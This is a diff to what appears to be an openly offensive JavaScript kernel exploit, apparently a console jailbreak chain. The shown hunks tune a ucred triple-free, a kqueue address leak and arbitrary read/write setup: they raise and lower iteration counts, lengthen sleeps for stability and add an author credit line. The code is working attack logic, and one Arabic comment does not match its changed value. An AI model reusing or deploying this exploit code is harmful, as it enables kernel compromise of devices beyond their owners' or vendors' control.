@@ -118,7 +118,7 @@ var IPV6_SOCK_NUM = 96;
 var IOV_THREAD_NUM = 6;
 var UIO_THREAD_NUM = 6;
 var MAIN_LOOP_ITERATIONS = 3;
-var TRIPLEFREE_ITERATIONS = 10;
+var TRIPLEFREE_ITERATIONS = 15;
 var MAX_ROUNDS_TWIN = 10;
 var MAX_ROUNDS_TRIPLET = 100;
 var MAIN_CORE = 0;
@@ -1069,8 +1069,6 @@ function exploit_phase_leak() {
     yield_to_render(exploit_phase_trigger);
     return;
   }
-
-  log('Exploit Read/Write...');
   
   yield_to_render(exploit_phase_rw);
 }
@@ -1117,6 +1115,7 @@ function safe_fhold_fd(fd, label) {
 }
 function setup_arbitrary_rw() {
   log(' Exploit Read/Write...');
+  log('Stability by M.ELHOUT');
 
   // 1) تأكيد إن kq_fdp صالح
   if (kq_fdp.eq(0)) {
@@ -1627,13 +1626,13 @@ function trigger_ucred_triplefree() {
 }
 function leak_kqueue() {
   debug('Leaking ...');
-
+  
   var kq = new BigInt(0);
   var magic_val = new BigInt(0x0, 0x1430000);
   var magic_add = leak_rthdr.add(0x08);
 
   var count = 0;
-  var MAX_KQ = 3000; 
+  var MAX_KQ = 1000; 
 
   while (count < MAX_KQ) {
     count++;
@@ -1653,7 +1652,7 @@ function leak_kqueue() {
     
     // توازن إيقاع: ندي الكيرنل نفس ياخده
     sched_yield();
-    nanosleep_fun(2); // كانت 1، خليناها 2 علشان ثبات أعلى
+    nanosleep_fun(2.5); // كانت 1، خليناها 2 علشان ثبات أعلى
 
     // محاولة التسريب
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
